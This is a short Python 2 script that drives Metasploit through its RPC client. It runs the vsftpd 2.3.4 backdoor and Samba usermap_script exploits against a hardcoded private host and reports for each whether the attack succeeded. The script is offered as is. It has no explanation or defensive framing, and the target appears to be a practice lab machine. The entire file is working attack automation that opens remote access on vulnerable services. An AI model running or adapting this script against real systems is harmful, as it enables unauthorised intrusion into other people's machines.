from metasploit.msfrpc import MsfRpcClient
from metasploit.msfconsole import MsfRpcConsole
# get the repository
# git clone https://github.com/allfro/pymetasploit
# python version 2.7
import time
client = MsfRpcClient('password')
commands = ['unix/ftp/vsftpd_234_backdoor', 'multi/samba/usermap_script']
targethost = '10.0.1.4'


for command in commands:
    exploit = client.modules.use('exploit', command)
    exploit['RHOSTS'] = targethost
    print exploit.payloads
    data = exploit.execute(payload = exploit.payloads[0])
    if data['job_id']  == None:
        print command + ' with payload of ' + exploit.payloads[0] + ' attack fails'
    else:
        print command +  ' with payload of ' + exploit.payloads[0] +' attack succeeds'